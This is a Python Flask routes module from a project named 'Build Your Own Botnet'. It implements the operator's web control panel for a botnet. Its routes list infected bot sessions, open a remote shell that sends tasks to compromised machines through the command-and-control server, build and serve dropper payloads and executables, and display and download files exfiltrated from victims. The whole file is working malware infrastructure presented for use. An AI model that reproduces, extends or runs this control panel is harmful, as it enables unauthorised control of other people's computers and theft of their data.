#!/usr/bin/python
# -*- coding: utf-8 -*-
"""Routes (Build Your Own Botnet)"""

import os
import sys
import json
import shutil
from datetime import datetime

from flask import Blueprint, flash, redirect, render_template, request, url_for, send_from_directory
from flask_login import login_user, logout_user, current_user, login_required

from buildyourownbotnet import app, db, bcrypt, client, server
from buildyourownbotnet.core import dao
from buildyourownbotnet.users.forms import RegistrationForm, LoginForm, UpdateAccountForm
from buildyourownbotnet.models import User, Session
from buildyourownbotnet.utils import get_sessions_serialized, get_tasks_serialized

# Blueprint
main = Blueprint('main', __name__)

# Globals
OUTPUT_DIR = os.path.abspath('buildyourownbotnet/output')

# Routes
@main.route("/dashboard")
@main.route("/sessions", methods=["GET"])
@login_required
def sessions():
	"""Display active/inactive sessions"""
	sessions = get_sessions_serialized(current_user.id)
	return render_template("sessions.html", sessions=sessions, n=len(sessions), title="Control Panel")


@main.route("/payloads")
@login_required
def payloads():
	"""Page for creating custom client scripts. Custom client scripts are generated on this page by sending user inputted values to 
	the '/generate' API endpoint, which writes the dropper to the user's output directory."""
	payloads = dao.get_payloads(current_user.id)
	return render_template("payloads.html", 
							payloads=payloads, 
							owner=current_user.username, 
							title="Payloads")


@main.route("/files")
@login_required
def files():
	"""Page for displaying files exfiltrated from client machines"""
	user_files = dao.get_files(current_user.id)
	return render_template("files.html", 
							files=user_files, 
							owner=current_user.username, 
							title="Files")


@main.route("/")
def home():
	"""Home page"""
	total_users = len(User.query.all())
	return render_template("home.html", total_users=total_users)


@main.route("/docs")
def docs():
	"""Project documentation."""
	return render_template("how-it-works.html", title="How It Works")


@main.route("/guide")
def guide():
	"""Quick start guide."""
	return render_template("guide.html", title="Guide")


@main.route("/faq")
def faq():
	"""FAQ page."""
	return render_template("faq.html", title="FAQ")


@main.route("/shell")
@login_required
def shell():
	"""Interact with a client session. Commands entered in JQuery terminal on the front-end are sent to back to the 
	Python back-end via POST to the API endpoint /cmd, where it can directly 
	call the C2 server's send_task and recv_task methods to transmit encrypted
	tasks/results via TCP connection."""
	session_uid = request.args.get('session_uid')

	# validate session id is valid integer
	if not session_uid:
		flash("Invalid bot UID: " + session_uid)
		return redirect(url_for('main.sessions'))

	# get current user sessions
	owner_sessions = server.c2.sessions.get(current_user.username)

	# check if owner has any active sessions
	if not owner_sessions:
		dao.update_session_status(session_uid, 0)
		flash("You have no bots online.", "danger")
		return redirect(url_for('main.sessions'))

	# check if requested session is owned by current user
	if session_uid not in owner_sessions:
		dao.update_session_status(session_uid, 0)
		flash("Invalid bot UID: " + str(session_uid))
		return redirect(url_for('main.sessions'))

	# get requested session
	session_thread = owner_sessions.get(session_uid)

	# if session is online, authenticate user and enter shell
	if session_thread:
		if session_thread.info['owner'] == current_user.username:
			return render_template("shell.html", 
									session_uid=session_uid, 
									info=session_thread.info, 
									title="Shell")
		else:
			flash("Bot not owned by current user.", "danger")
			return redirect(url_for('main.sessions'))

	# if bot is offline, update status in database and notify user
	else:
		dao.update_session_status(session_uid, 0)
		flash("Bot is offline.", "danger")
		return redirect(url_for('main.sessions'))


@main.route("/tasks", methods=["GET"])
@login_required
def tasks():
	"""Task history for a client"""
	session_uid = request.args.get('session_uid')

	# get serialized task history from database
	tasks = get_tasks_serialized(session_uid)

	# show task history as a table
	return render_template("tasks.html", 
							tasks=tasks, 
							session_uid=session_uid,
							title="Tasks")


#####################
#
# DOWNLOADS
#
#####################

@main.route("/output/<user>/src/dist/<operating_system>/<filename>")
@login_required
def download_executable(user, operating_system, filename):
	"""Download user generated binary executable payload."""
	return send_from_directory(os.path.join(OUTPUT_DIR, user, 'src', 'dist', operating_system), filename, as_attachment=True)


@main.route("/output/<user>/src/<filename>")
@login_required
def download_payload(user, filename):	
	"""Download user generated Python payload."""
	return send_from_directory(os.path.join(OUTPUT_DIR, user, 'src'), filename, as_attachment=True)


@main.route("/output/<user>/files/<filename>")
@login_required
def download_file(user, filename):
	"""Download user exfiltrated file."""
	return send_from_directory(os.path.join(OUTPUT_DIR, user, 'files'), filename, as_attachment=True)
